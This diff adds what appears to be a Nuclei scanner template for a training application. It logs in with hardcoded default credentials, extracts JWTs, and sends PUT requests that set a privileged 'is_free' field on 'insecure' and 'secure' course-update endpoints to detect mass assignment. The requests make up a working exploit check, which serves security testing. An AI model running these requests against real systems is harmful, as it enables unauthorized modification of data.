@@ -1,0 +1,169 @@
+id: mass-assignment-idor
+info:
+  name: Mass Assignment IDOR
+  severity: high
+  description: Scan for Mass Assignment IDOR
+
+
+requests:
+  - raw:
+    - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"email":"admin@we45.com","password":"admin"}
+
+    - |
+        POST /register HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"first_name":"John","last_name":"Doe","email":"john@doe.com","password":"admin"}
+
+    extractors:
+      - type: regex
+        part: body
+        internal: true
+        name: atoken
+        regex:
+          - 'eyJ[a-zA-Z0-9]{10,}\.eyJ[a-zA-Z0-9]{10,}\.[a-zA-Z0-9_\-]{10,}'
+
+
+  - raw:
+    - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"email":"john@doe.com","password":"admin"}
+
+    - |
+        POST /course/create HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: {{ntoken}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"name":"test","description":"test"}
+
+    extractors:
+      - type: regex
+        part: body
+        internal: true
+        name: ntoken
+        regex:
+          - 'eyJ[a-zA-Z0-9]{10,}\.eyJ[a-zA-Z0-9]{10,}\.[a-zA-Z0-9_\-]{10,}'
+
+  
+# Insecure Test
+  - raw:  
+    - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"email":"john@doe.com","password":"admin"}    
+
+    - |
+        GET /course/list HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: {{ntoken}}
+        Content-Type: application/json;charset=UTF-8
+
+    - |
+        PUT /course/update/insecure/1 HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: {{ntoken}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"name":"test","description":"test","is_free":true}
+
+    - |
+        GET /course/list HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: {{ntoken}}
+        Content-Type: application/json;charset=UTF-8
+
+    extractors:
+      - type: regex
+        part: body
+        internal: true
+        name: ntoken
+        regex:
+          - 'eyJ[a-zA-Z0-9]{10,}\.eyJ[a-zA-Z0-9]{10,}\.[a-zA-Z0-9_\-]{10,}'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Course updated successfully!"
+
+
+# Secure Test
+  - raw:
+    - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"email":"john@doe.com","password":"admin"}
+
+    - |
+        PUT /course/update/insecure/1 HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: {{ntoken}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"name":"test","description":"test","is_free":false}
+
+    extractors:
+      - type: regex
+        part: body
+        internal: true
+        name: ntoken
+        regex:
+          - 'eyJ[a-zA-Z0-9]{10,}\.eyJ[a-zA-Z0-9]{10,}\.[a-zA-Z0-9_\-]{10,}'
+
+  - raw:
+    - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"email":"john@doe.com","password":"admin"}
+
+    - |
+        GET /course/list HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: {{ntoken}}
+        Content-Type: application/json;charset=UTF-8
+        
+    - |
+        PUT /course/update/secure/1 HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: {{ntoken}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"name":"test","description":"test","is_free":true}
+
+    - |
+        GET /course/list HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: {{ntoken}}
+        Content-Type: application/json;charset=UTF-8
+
+    extractors:
+      - type: regex
+        part: body
+        internal: true
+        name: ntoken
+        regex:
+          - 'eyJ[a-zA-Z0-9]{10,}\.eyJ[a-zA-Z0-9]{10,}\.[a-zA-Z0-9_\-]{10,}'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Course updated successfully!"
